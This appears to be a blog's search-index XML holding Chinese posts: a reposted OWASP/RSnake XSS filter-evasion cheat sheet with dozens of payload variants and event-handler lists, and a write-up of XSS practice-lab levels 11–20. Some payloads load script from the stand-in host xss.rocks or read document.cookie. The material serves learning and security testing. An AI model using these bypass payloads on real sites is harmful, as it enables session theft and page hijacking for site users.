<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[XSS绕过速查（一）]]></title>
    <url>%2F2019%2F10%2F14%2FXSS%E7%BB%95%E8%BF%87%E9%80%9F%E6%9F%A5%EF%BC%88%E4%B8%80%EF%BC%89%2F</url>
    <content type="text"><![CDATA[今天继续XSS的进一步学习，以下内容转载自Freebuf上的文章，原文章来自OWASP的xss备忘录 1.介绍这篇文章的主要目的是给专业安全测试人员提供一份跨站脚本漏洞检测指南。文章的初始内容是由RSnake提供给 OWASP，内容基于他的XSS备忘录:http://ha.ckers.org/xss.html。目前这个网页已经重定向到OWASP网站，将由OWASP维护和完善它。OWASP 的第一个防御备忘录项目：XSS (Cross Site Scripting)Prevention Cheat Sheet 灵感来源于 RSnake 的 XSS Cheat Sheet，所以我们对他给予我们的启发表示感谢。我们想要去创建短小简单的参考给开发者以便帮助他们预防 XSS漏洞，而不是简单的告诉他们需要使用复杂的方法构建应用来预防各种千奇百怪的攻击，这也是OWASP 备忘录系列诞生的原因。 2.测试这份备忘录是为那些已经理解XSS攻击，但是想要了解关于绕过过滤器方法之间细微差别的人准备的。 请注意大部分的跨站脚本攻击向量已经在其代码下方给出的浏览器列表中进行测试。 2.1. XSS定位器在大多数存在漏洞且不需要特定XSS攻击代码的地方插入下列代码会弹出包含“XSS”字样的对话框。使用URL编码器来对整个代码进行编码。小技巧：如果你时间很紧想要快速检查页面，通常只要插入“&lt;任意文本&gt;”标签，然后观察页面输出是否明显改变了就可以判断是否存在漏洞(javascript中注入测试payload)： 12345';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//–&gt;&lt;/SCRIPT&gt;"&gt;'&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt; 2.2. XSS定位器（短）如果你没有足够的空间并且知道页面上没有存在漏洞的JavaScript，这个字符串是一个不错的简洁XSS注入检查。注入后查看页面源代码并且寻找是否存在&lt;XSS 或&amp;lt;XSS字样来确认是否存在漏洞 1”;!–”&lt;XSS&gt;=&amp;&#123;()&#125; 2.3. 无过滤绕过这是一个常规的XSS注入代码，虽然通常它会被防御，但是建议首先去测试一下。（引号在任何现代浏览器中都不需要，所以这里省略了它）： 1&lt;SCRIPT SRC=http://xss.rocks/xss.js&gt;&lt;/SCRIPT&gt; 2.4. 利用多语言进行过滤绕过1234567891011'"&gt;&gt;&lt;marquee&gt;&lt;img src=x onerror=confirm(1)&gt;&lt;/marquee&gt;”&gt;&lt;/plaintext\&gt;&lt;/|\&gt;&lt;plaintext/onmouseover=prompt(1)&gt;&lt;script&gt;prompt(1)&lt;/script&gt;@gmail.com&lt;isindex formaction=javascript:alert(/XSS/) type=submit&gt;’–&gt;”&gt;&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;”&gt;&lt;img/id=”confirm&amp;lpar;1)”/alt=”/”src=”/”onerror=eval(id)&gt;’”&gt;&lt;img src=”http://www.shellypalmer.com/wp-content/images/2015/07/hacked-compressor.jpg“&gt; 2.5. 通过JavaScript命令实现的图片XSS图片注入使用JavaScript命令实现（IE7.0 不支持在图片上下文中使用JavaScript 命令，但是可以在其他上下文触发。下面的例子展示了一种其他标签依旧通用的原理）： 1&lt;IMG SRC="javascript:alert(‘XSS’);"&gt; 2.6. 无分号无引号1&lt;IMG SRC=javascript:alert(‘XSS’)&gt; 2.7. 不区分大小写的XSS攻击向量1&lt;IMG SRC=JaVaScRiPt:alert(‘XSS’)&gt; 2.8. HTML实体必须有分号才可生效 1&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)&gt; 2.9. 重音符混淆如果你的JavaScript代码中需要同时使用单引号和双引号，那么可以使用重音符（`）来包含JavaScript 代码。这通常会有很大帮助，因为大部分跨站脚本过滤器都没有过滤这个字符： 1&lt;IMG SRC=`javascript:alert(“RSnake says, ‘XSS’”)`&gt; 2.10. 畸形的A标签跳过HREF标签找到XSS的重点。。。由DavidCross提交~已在Chrome上验证 1&lt;a onmouseover="alert(document.cookie)"&gt;xxs link&lt;/a&gt; 此外Chrome经常帮你补全确实的引号。。。如果在这方面遇到问题就直接省略引号，Chrome会帮你补全在URL或脚本中缺少的引号。 1&lt;a onmouseover=alert(document.cookie)&gt;xxs link&lt;/a&gt; 2.11. 畸形的IMG标签最初由Begeek发现（短小精湛适用于所有浏览器），这个XSS攻击向量使用了不严格的渲染引擎来构造含有IMG标签并被引号包含的XSS攻击向量。我猜测这种解析原来是为了兼容不规范的编码。这会让它更加难以正确的解析HTML标签： 1&lt;IMG """&gt;&lt;SCRIPT&gt;alert("XSS")&lt;/SCRIPT&gt;"&gt; 2.12. fromCharCode函数如果不允许任何形式的引号，你可以通过执行JavaScript里的fromCharCode函数来创建任何你需要的XSS攻击向量： 1&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt; 2.13. 使用默认SRC属性绕过SRC域名过滤器这种方法可以绕过大多数SRC域名过滤器。将JavaScript代码插入事件方法同样适用于注入使用elements的任何HTML标签，例如Form,Iframe, Input, Embed等等。它同样允许将事件替换为任何标签中可用的事件类型，例如onblur,onclick。下面会给出许多不同的可注入事件列表。由David Cross提交，Abdullah Hussam(@Abdulahhusam)编辑。 1&lt;IMG SRC=# onmouseover="alert('xxs')"&gt; 实际测试中#不可用 2.14. 使用默认为空的SRC属性1&lt;IMG SRC= onmouseover="alert('xxs')"&gt; 实际测试中浏览器会在src后加引号把onmouseover后的内容当作是src的内容，chrome，firefox和IE中都是，此条方法作废。 2.15. 使用不含SRC属性1&lt;IMG onmouseover="alert('xxs')"&gt; 实际测试中无SRC会导致图片大小为0，无法用onmouseover触发，需要用src=/ 来使图片有大小进而触发onmouseover事件 2.16. 通过error事件触发alert1&lt;IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"&gt;&lt;/img&gt; 2.17. 对IMG标签中onerror属性进行编码12&lt;img src=x onerror="&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041"&gt; 2.18. 十进制HTML字符实体编码所有在IMG标签里直接使用javascript:形式的XSS示例无法在Firefox或Netscape8.1以上浏览器（使用Gecko渲染引擎）运行。 1&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&gt; &amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt; 2.19. 不带分号的十进制HTML字符实体编码这对于绕过对“&#XX;”形式的XSS过滤非常有用，因为大多数人不知道最长可使用7位数字。这同样对例如$tmp_string =~s/.*\&amp;#(\d+);.*/$1/;形式的过滤器有效，这种过滤器是错误的认为HTML字符实体编码需要用分号结尾（无意中发现的）： 1&lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt; 我的电脑无法实现 2.20. 不带分号的十六进制HTML字符实体编码这是有效绕过例如$tmp_string =~ s/.*\&amp;#(\d+);.*/$1/;过滤器的方法。这种过滤器错误的认为#号后会跟着数字（十六进制HTML字符实体编码并非如此） 1&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt; 2.21. 内嵌TAB使用TAB来分开XSS攻击代码： 1&lt;IMG SRC=”jav ascript:alert(‘XSS’);”&gt; 2.22. 内嵌编码后TAB使用编码后的TAB来分开XSS攻击代码： 1&lt;IMG SRC="jav&amp;#x09;ascript:alert(‘XSS’);"&gt; 2.23. 内嵌换行分隔XSS攻击代码一些网站声称09到13（十进制）的HTML实体字符都可以实现这种攻击，这是不正确的。只有09（TAB），10（换行）和13（回车）有效。查看ASCII字符表获取更多细节。下面几个XSS示例介绍了这些向量。 1&lt;IMG SRC="jav&amp;#x0A;ascript:alert(‘XSS’);"&gt; 2.24. 内嵌回车分隔XSS攻击代码注意：上面使用了比实际需要长的字符串是因为0可以忽略。经常可以遇到过滤器解码十六进制和十进制编码时认为只有2到3位字符。实际规则是1至7位字符： 1&lt;IMG SRC="jav&amp;#x0D;ascript:alert(‘XSS’);"&gt; 2.25. 使用空字符分隔JavaScript指令空字符同样可以作为XSS攻击向量，但和上面有所区别，你需要使用一些例如Burp工具或在URL字符串里使用%00，亦或你想使用VIM编写自己的注入工具（^V^@会生成空字符），还可以通过程序生成它到一个文本文件。老版本的Opera浏览器（例如Windows版的7.11）还会受另一个字符173（软连字符）的影响。但是空字符%00更加有用并且能帮助绕过真实世界里的过滤器，例如这个例子里的变形： 1perl -e 'print "&lt;IMG SRC=java\0script:alert(\”XSS\”)&gt;";' &gt; out 2.26. 利用IMG标签中JavaScript指令前的空格和元字符如果过滤器不计算”javascript:”前的空格，这是正确的，因为它们不会被解析，但这点非常有用。因为这会造成错误的假设，就是引号和”javascript:”字样间不能有任何字符。实际情况是你可以插入任何十进制的1至32号字符： 1&lt;IMG SRC=" &amp;#14; javascript:alert('XSS');"&gt; 2.27. 利用非字母非数字字符FireFox的HTML解析器认为HTML关键词后不能有非字母非数字字符，并且认为这是一个空白或在HTML标签后的无效符号。但问题是有的XSS过滤器认为它们要查找的标记会被空白字符分隔。例如&quot;&lt;SCRIPT\s&quot; != &quot;&lt;SCRIPT/XSS\s&quot;: 1&lt;SCRIPT/XSS SRC=”http://xss.rocks/xss.js“&gt;&lt;/SCRIPT&gt; 基于上面的原理，可以使用模糊测试进行扩展。Gecko渲染引擎允许任何字符包括字母，数字或特殊字符（例如引号，尖括号等）存在于事件名称和等号之间，这会使得更加容易绕过跨站脚本过滤。注意这同样适用于下面看到的重音符: 1&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert("XSS")&gt; 上面发现+号可以，其他不行，下面的倒是可以用/来代替空格 Yair Amit让我注意到了IE和Gecko渲染引擎有一点不同行为，在于是否在HTML标签和参数之间允许一个不含空格的斜杠。这会非常有用如果系统不允许空格的时候。 1&lt;SCRIPT/SRC=”http://xss.rocks/xss.js“&gt;&lt;/SCRIPT&gt; 2.28. 额外的尖括号由Franz Sedlmaier提交，这个XSS攻击向量可以绕过某些检测引擎，比如先查找第一个匹配的尖括号，然后比较里面的标签内容，而不是使用更有效的算法，例如Boyer-Moore算法就是查找整个字符串中的尖括号和相应标签（当然是通过模糊匹配）。双斜杠注释了额外的尖括号来防止出现JavaScript错误： 1&lt;&lt;SCRIPT&gt;alert("XSS");//&lt;&lt;/SCRIPT&gt; 2.29. 未闭合的script标签在Firefox和Netscape 8.1的Gecko渲染引擎下你不是必须构造类似“&gt;&lt;/SCRIPT&gt;”的跨站脚本攻击向量。Firefox假定闭合HTML标签是安全的并且会为你添加闭合标记。多么体贴！不像不影响Firefox的下一个问题，这不需要在后面有额外的HTML标签。如果需要可以添加引号，但通常是没有必要的，需要注意的是，我并不知道这样注入后HTML会什么样子结束: 1&lt;SCRIPT SRC=http://xss.rocks/xss.js%20 2.30. script标签中的协议解析这个特定的变体是由Łukasz Pilorz提交的并且基于Ozh提供的协议解析绕过。这个跨站脚本示例在IE和Netscape的IE渲染模式下有效，如果添加了&lt;/SCRIPT&gt;标记在Opera中也可以。这在输入空间有限的情况下是非常有用的，你所使用的域名越短越好。”.j”是可用的，在SCRIPT标签中不需要考虑编码类型因为浏览器会自动识别。 1&lt;SCRIPT SRC=//xss.rocks/.j&gt; 2.31. 只含左尖括号的HTML/JavaScript XSS向量IE渲染引擎不像Firefox，不会向页面中添加额外数据。但它允许在IMG标签中直接使用javascript。这对构造攻击向量是很有用的，因为不需要闭合尖括号。这使得有任何HTML标签都可以进行跨站脚本攻击向量注入。甚至可以不使用”&gt;”闭合标签。注意：这会让HTML页面变得混乱，具体程度取决于下面的HTML标签。这可以绕过以下NIDS正则:/((\%3D)|(=))[^\n]*((\%3C)|&lt;)[^\n]+((\%3E)|&gt;)/因为不需要”&gt;”闭合。另外在实际对抗XSS过滤器的时候，使用一个半开放的&lt;IFRAME标签替代&lt;IMG标签也是非常有效的。 1&lt;IMG SRC="javascript:alert('XSS')" 2.32. 多个左尖括号使用一个左尖括号替代右尖括号作为标签结尾的攻击向量会在不同浏览器的Gecko渲染引擎下有不同表现。没有左尖括号时，在Firefox中生效，而在Netscape中无效。 1&lt;iframe src=http://xss.rocks/scriptlet.html &lt; 2.33. JavaScript双重转义当应用将一些用户输入输出到例如： 1&lt;SCRIPT&gt;var a="$ENV&#123;QUERY_STRING&#125;";&lt;/SCRIPT&gt; 的JavaScript中时，你想注入你的JavaScript脚本，你可以通过转义转义字符来规避服务器端转义引号。注入后会得到&lt;SCRIPT&gt;var a=”\”;alert(‘XSS’);//”;&lt;/SCRIPT&gt;，这时双引号不会被转义并且可以触发跨站脚本攻击向量。XSS定位器就用了这种方法: 1\”;alert(‘XSS’);// 另一种情况是，如果内嵌数据进行了正确的JSON或JavaScript转义，但没有HTML编码，那可以结束原有脚本块并开始你自己的： 1&lt;/script&gt;&lt;script&gt;alert(‘XSS’);&lt;/script&gt; 2.34. 闭合title标签这是一个简单的闭合&lt;TITLE&gt;标签的XSS攻击向量，可以包含恶意的跨站脚本攻击: 1&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(“XSS”);&lt;/SCRIPT&gt; 2.35. INPUT image1&lt;INPUT TYPE="IMAGE" SRC="javascript:alert(‘XSS’);"&gt; 2.36. BODY image1&lt;BODY BACKGROUND="javascript:alert(‘XSS’)"&gt; 2.37. IMG Dynsrc1&lt;IMG DYNSRC="javascript:alert(‘XSS’)"&gt; 2.38. IMG lowsrc1&lt;IMG LOWSRC="javascript:alert(‘XSS’)"&gt; 2.39. List-style-image处理嵌入的图片列表是很麻烦的问题。由于JavaScript指令的原因只能在IE渲染引擎下有效。不是一个特别有用的跨站脚本攻击向量: 1&lt;STYLE&gt;li &#123;list-style-image: url("javascript:alert('XSS')");&#125;&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS&lt;/br&gt; 2.40. 图片中引用VBscript1&lt;IMG SRC='vbscript:msgbox("XSS")'&gt; 2.41. Livescript (仅限旧版本Netscape)1&lt;IMG SRC="livescript:[code]"&gt; 2.42. SVG对象标签1&lt;svg/onload=alert('XSS')&gt; 2.43. ECMAScript 61Set.constructor`alert\x28document.domain\x29` 2.44. BODY标签这个方法不需要使用任何例如”javascript:”或”&lt;SCRIPT…”语句来完成XSS攻击。Dan Crowley特别提醒你可以在等号前加入一个空格(“onload=” != “onload =”): 1&lt;BODY ONLOAD=alert('XSS')&gt; 2.45. 事件处理程序在XSS攻击中可使用以下事件（在完稿的时候这是网上最全的列表了）。感谢ReneLedosquet的更新。 \1. FSCommand() (攻击者当需要在嵌入的Flash对象中执行时可以使用此事件) \2. onAbort() (当用户中止加载图片时) \3. onActivate() (当对象激活时) \4. onAfterPrint() (用户打印或进行打印预览后触发) \5. onAfterUpdate() (从数据源对象更新数据后由数据对象触发) \6. onBeforeActivate() (在对象设置为激活元素前触发) \7. onBeforeCopy() (攻击者在选中部分拷贝到剪贴板前执行攻击代码-攻击者可以通过执行execCommand(“Copy”)函数触发) \8. onBeforeCut() (攻击者在选中部分剪切到剪贴板前执行攻击代码) \9. onBeforeDeactivate() (在当前对象的激活元素变化前触发) \10. onBeforeEditFocus() (在一个包含可编辑元素的对象进入激活状态时或一个可编辑的对象被选中时触发) \11. onBeforePaste() (在用户被诱导进行粘贴前或使用execCommand(“Paste”)函数触发) \12. onBeforePrint() (用户需要被诱导进行打印或攻击者可以使用print()或execCommand(“Print”)函数). \13. onBeforeUnload() (用户需要被诱导关闭浏览器-除非从父窗口执行，否则攻击者不能关闭当前窗口) \14. onBeforeUpdate() (从数据源对象更新数据前由数据对象触发) \15. onBegin() (当元素周期开始时由onbegin 事件立即触发) \16. onBlur() (另一个窗口弹出当前窗口失去焦点时触发) \17. onBounce() (当marquee对象的behavior属性设置为“alternate”且字幕的滚动内容到达窗口一边时触发) \18. onCellChange() (当数据提供者的数据变化时触发) \19. onChange() (select，text, 或TEXTAREA字段失去焦点并且值发生变化时触发) \20. onClick() (表单中点击触发) \21. onContextMenu() (用户需要在攻击区域点击右键) \22. onControlSelect() (当用户在一个对象上创建控件选中区时触发) \23. onCopy() (用户需要复制一些东西或使用execCommand(“Copy”)命令时触发) \24. onCut() (用户需要剪切一些东西或使用execCommand(“Cut”)命令时触发) \25. onDataAvailable() (用户需要修改元素中的数据，或者由攻击者提供的类似功能) \26. onDataSetChanged() (当数据源对象变更导致数据集发生变更时触发) \27. onDataSetComplete() (数据源对象中所有数据可用时触发) \28. onDblClick() (用户双击一个表单元素或链接) \29. onDeactivate() (在激活元素从当前对象转换到父文档中的另一个对象时触发) \30. onDrag() (在元素正在拖动时触发) \31. onDragEnd() (当用户完成元素的拖动时触发) \32. onDragLeave() (用户在拖动元素离开放置目标时触发) \33. onDragEnter() (用户将对象拖拽到合法拖曳目标) \34. onDragOver() (用户将对象拖拽划过合法拖曳目标) \35. onDragDrop() (用户将一个对象（例如文件）拖拽到浏览器窗口) \36. onDragStart() (当用户开始拖动元素时触发) \37. onDrop() (当拖动元素放置在目标区域时触发) \38. onEnded() (在视频/音频（audio/video）播放结束时触发) \39. onError() (在加载文档或图像时发生错误) \40. onErrorUpdate() (当从数据源对象更新相关数据遇到错误时在数据绑定对象上触发) \41. onFilterChange() (当滤镜完成状态变更时触发) \42. onFinish() (当marquee完成滚动时攻击者可以执行攻击) \43. onFocus() (当窗口获得焦点时攻击者可以执行攻击代码) \44. onFocusIn() (当元素将要被设置为焦点之前触发) \45. onFocusOut() (攻击者可以在窗口失去焦点时触发攻击代码) \46. onHashChange() (当锚部分发生变化时触发攻击代码) \47. onHelp() (攻击者可以在用户在当前窗体激活时按下F1触发攻击代码) \48. onInput() (在 或 元素的值发生改变时触发) \49. onKeyDown() (用户按下一个键的时候触发) \50. onKeyPress() (在键盘按键被按下并释放一个键时触发) \51. onKeyUp() (用户释放一个键时触发) \52. onLayoutComplete() (用户进行完打印或打印预览时触发) \53. onLoad() (攻击者在窗口加载后触发攻击代码) \54. onLoseCapture() (可以由releaseCapture()方法触发) \55. onMediaComplete() (当一个流媒体文件使用时，这个事件可以在文件播放前触发) \56. onMediaError() (当用户在浏览器中打开一个包含媒体文件的页面，出现问题时触发事件) \57. onMessage() (当页面收到一个信息时触发事件) \58. onMouseDown() (攻击者需要让用户点击一个图片触发事件) \59. onMouseEnter() (光标移动到一个对象或区域时触发) \60. onMouseLeave() (攻击者需要让用户光标移动到一个图像或表格然后移开来触发事件) \61. onMouseMove() (攻击者需要让用户将光标移到一个图片或表格) \62. onMouseOut() (攻击者需要让用户光标移动到一个图像或表格然后移开来触发事件) \63. onMouseOver() (光标移动到一个对象或区域) \64. onMouseUp() (攻击者需要让用户点击一个图片) \65. onMouseWheel() (攻击者需要让用户使用他们的鼠标滚轮) \66. onMove() (用户或攻击者移动页面时触发) \67. onMoveEnd() (用户或攻击者移动页面结束时触发) \68. onMoveStart() (用户或攻击者开始移动页面时触发) \69. onOffline() (当浏览器从在线模式切换到离线模式时触发) \70. onOnline() (当浏览器从离线模式切换到在线模式时触发) \71. onOutOfSync() (当元素与当前时间线失去同步时触发) \72. onPaste() (用户进行粘贴时或攻击者可以使用execCommand(“Paste”)函数时触发) \73. onPause() (在视频或音频暂停时触发) \74. onPopState() (在窗口的浏览历史（history 对象）发生改变时触发) \75. onProgress() (攻击者可以在一个FLASH加载时触发事件) \76. onPropertyChange() (用户或攻击者需要改变元素属性时触发) \77. onReadyStateChange() (每次 readyState 属性变化时被自动调用) \78. onRedo() (用户返回上一页面时触发) \79. onRepeat() (事件在播放完重复播放时触发) \80. onReset() (用户或攻击者重置表单时触发) \81. onResize() (用户改变窗口大小时，攻击者可以自动以这种方法触发:&lt;SCRIPT&gt;self.resizeTo(500,400);&lt;/SCRIPT&gt;) \82. onResizeEnd() (用户完成改变窗体大小时触发) \83. onResizeStart() (用户开始改变窗体大小时触发) \84. onResume() (当元素继续播放时触发) \85. onReverse() (当元素回放时触发) \86. onRowsEnter() (用户或攻击者需要改变数据源中的一行) \87. onRowExit() (用户或攻击者改变数据源中的一行后退出时触发) \88. onRowDelete() (用户或攻击者需要删除数据源中的一行) \89. onRowInserted() (user or attacker would needto insert a row in a data source) \90. onScroll() (用户需要滚动或攻击者使用scrollBy()函数) \91. onSeek() (当用户在元素上执行查找操作时触发) \92. onSelect() (用户需要选择一些文本-攻击者可以以此方式触发: window.document.execCommand(“SelectAll”);) \93. onSelectionChange() (当用户选择文本变化时触发-攻击者可以以此方式触发: window.document.execCommand(“SelectAll”);) \94. onSelectStart() (当用户开始选择文本时触发-攻击者可以以此方式触发: window.document.execCommand(“SelectAll”);) \95. onStart() (在marquee 对象开始循环时触发) \96. onStop() (当用户按下停止按钮或离开页面时触发) \97. onStorage() (当Web Storage更新时触发) \98. onSyncRestored() (当元素与它的时间线恢复同步时触发) \99. onSubmit() (需要用户或攻击者提交表单) 100.onTimeError() (用户或攻击者设置时间属性出现错误时触发) 101.onTrackChange() (用户或攻击者改变播放列表内歌曲时触发) 102.onUndo() (用户返回上一浏览记录页面时触发) 103.onUnload() (用户点击任意链接或按下后退按钮或攻击者强制进行点击时触发) 104.onURLFlip() (当一个高级流媒体格式（ASF）文件，由一个HTML+TIME（基于时间交互的多媒体扩展）媒体标签播放时，可触发在ASF文件中内嵌的攻击脚本) 105.seekSegmentTime() (这是一个方法可以定位元素某个时间段内中的特定的点，并可以从该点播放。这个段落包含了一个重复的时间线，并包括使用AUTOREVERSE属性进行反向播放。) 2.46. BGSOUND1&lt;BGSOUND SRC="javascript:alert('XSS');"&gt; 2.47. &amp; JavaScript包含1&lt;BR SIZE="&amp;&#123;alert('XSS')&#125;"&gt; 2.48. 样式表1&lt;LINK REL="stylesheet" HREF="javascript:alert('XSS');"&gt; 2.49. 远程样式表(利用像远程样式表一样简单的形式，你可以将XSS攻击代码包含在可使用内置表达式进行重定义的样式参数里。)这只在IE和使用IE渲染模式Netscape8.1+。注意这里没有任何元素在页面中表明这页面包含了JavaScript。提示：这些远程样式表都使用了body标签,所以必须在页面中有除了攻击向量以外的内容存在时才会生效, 也就是如果是空白页的话你必须在页面添加一个字母来让攻击代码生效: 1&lt;LINK REL="stylesheet" HREF="http://xss.rocks/xss.css"&gt; 2.50. 远程样式表2这个和上面一样有效，不过使用了&lt;STYLE&gt;标签替代&lt;LINK&gt;标签. 这个细微的变化曾经用来攻击谷歌桌面。另一方面，如果在攻击向量后有HTML标签闭合攻击向量，你可以移除末尾的&lt;/STYLE&gt;标签。在进行跨站脚本攻击时，如不能同时使用等号或斜杠，这是非常有用的，这种情况在现实世界里不止一次发生了: 1&lt;STYLE&gt;@import'http://xss.rocks/xss.css';&lt;/STYLE&gt; 2.51. 远程样式表3这种方式仅在Opera 8.0(9.x不可以)中有效，但方法比较有创意. 根据RFC2616，设置一个Link头部不是HTTP1.1规范的一部分,但一些浏览器仍然允许这样做 (例如Firefox和 Opera). 这里的技巧是设置一个头部（和普通头部并没有什么区别，只是设置Link: &lt;http://xss.rocks/xss.css\&gt;; REL=stylesheet）并且在远程样式表中包含使用了JavaScript的跨站脚本攻击向量，这一点是FireFox不支持的: 1&lt;META HTTP-EQUIV="Link" Content="&lt;http://xss.rocks/xss.css&gt;; REL=stylesheet"&gt; 2.52. 远程样式表4这仅能在Gecko渲染引擎下有效并且需要在父页面绑定一个XML文件。具有讽刺意味的是 Netscape认为Gecko更安全 ，所以对绝大多数网站来说会受到漏洞影响: 1&lt;STYLE&gt;BODY&#123;-moz-binding:url("http://xss.rocks/xssmoz.xml#xss")&#125;&lt;/STYLE&gt;]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>WEB</tag>
        <tag>CTF</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS(二)]]></title>
    <url>%2F2019%2F10%2F11%2FXSS-%E4%BA%8C%2F</url>
    <content type="text"><![CDATA[我们今天接着上一次的说后20道题 L11首先还是把源码拉出来，又是几个隐藏的表单项，受上一题的启发，我们先手动补一个type=submit，name=my_submit的input标签，然后提交一下试试，这是结果： 这时我们发现有两处回显，经过测试，t_sort处的过滤实在是无法绕过（有可以绕过的大佬求求教我一哈~），当发现各种操作都无法绕过后，我开始将注意转向t_ref，这是啥？等等。。ref是不是referr的简写？burp抓包瞅一眼，发现referr传的就是这串东西，那我们能不能通过改这个来完成XSS注入？修改referr为：&quot;onmouseover=alert(/xss/),OK,搞定 L12还是先看看源代码，欸，发现个t_ua，而且其字段，哇，好熟悉，这不就是user-agent嘛？受上一题的启发，burp启动！抓包！改user-agent为&quot;onmouseover=alert(/xss/) OK，搞定，就不附图了，一样的 L13同样先看源码，woc，这次变成t_cook了？难道是cookie？再一看，都是call me maybe？，懂了吧都？直接burp抓包，改啥我就不用多说了 L14抱歉这题真的做不了，但是看大佬说，似乎想考EXIF XSS，既然没法做，这里就学一下啥叫EXIF XSS吧。以下是百度百科： 可交换图像文件格式（英语：Exchangeable image file format，官方简称Exif），是专门为数码相机的照片设定的，可以记录数码照片的属性信息和拍摄数据。 其实简单来说，也就是右键点开一个图片的属性时，里面加的制造厂商，相机型号，曝光时间，光圈值等等，有没有突然发现，这些数据是我们可以人为修改的？那有没有联想到一些刺激的事？ 其实EXIF XSS就是利用了这些可控的数据，在其中填入XSS的攻击向量，当服务器端去解析图片时，就会触发XSS的payload，这就是利用的原理，如果某些EXIF插件在解析图片时没有经过过滤，就会造成这种攻击，一个具体的攻击案例可以参考如下博客： https://www.hackersb.cn/hacker/140.html L15不得不说，这题真心做不出来，我都查到了ng-include是AngularJS的语法了，也知道它可以引入一个外部的文件进行解析，但是真的没查到在URL中的引入参数名为src。。。。就当是学习了，记下了。知道是src为引入外部html的参数名后，就简单了，我们通过引入level1的html就欧克了（由于策略问题，只能引入同源的html，也就是说只能引入同一域名下的html，所以引入level），构造payload为src=&#39;level1.php?name=&lt;img src=x onerror=alert(/xss/)&gt;&#39; 实现弹窗，这里顺便说一下，payload为src=&#39;level1.php?name=&lt;script&gt;alert(/xss/)&lt;/script&gt;&#39; 时并不会弹窗，这是为什么呢？我猜测是。。好像不大靠谱。。有木有大佬给我讲讲为啥啊。。。？好迷茫 哦对，这个题由于用的是Google的API，如果不翻墙可能加载不出来，这也是比较坑的地方。。做的时候注意一下，我刚开始就是连api都没请求到。。。。附一下成功后的代码： L16上来稍微测试下，发现跟前面某一题好像欸，又是把script替换成空了。。但是仔细看，其实不是替换成空了，而是替换成&amp;nbsp; 了，这一点双写一下script就可以发现。 那么，现在script是用不了了，尝试一下img标签吧，构造：&lt;img src=x onerror=alert(1)&gt; 发现空格被html实体编码了。。 擦，这就挡得住我们嘛？当然不，不就是要空开嘛？我们可以尝试用%0a或%0d来绕过，尝试构造&lt;img%0asrc=x%0aonerror=alert(1)&gt; OK，绕过了~ L17和L18一块说了，没发现啥区别，先说，这道题需要装flash了。。要不然火狐就做不了。。。刚开始我电脑没装adobe flash，直接就不加载 。。我醉了。。。 有flash拓展后，发现有两个参数我们可以控制且会被拼接，我们先试试直接来加事件可不可以。构造arg01=a&amp;arg02=b onmouseover=alert(1) , woc直接成了。。。而且两题都是这样。。没发现有啥区别。。。 L19和L20这两题也放在一块说，考的都是flash的语法。。对不起打扰了，我真的不会。。。这里说一下大佬的wp吧： 19的payload为：arg01=version&amp;arg02=&lt;a href=&quot;javascript:alert(document.domain)&quot;&gt;xss&lt;/a&gt; 传递一个version参数，这时再去加载flash时就会出现一个链接，点击后弹窗。。如图： L20就更玄幻了。。 paylaod=arg01=id&amp;arg02=\%22))}catch(e){}if(!self.a)self.a=!alert(document.cookie))//%26width%26height 对不起打扰了，我是弟弟。。关于flash语法，以后有时间可以写一下，完善一下自己的知识，似乎flash爆出的漏洞还不少。。确实应该学一学。 好了，今天就到这里了，明天见嘿嘿~]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>WEB</tag>
        <tag>CTF</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[搭建博客]]></title>
    <url>%2F2019%2F10%2F07%2F%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%2F</url>
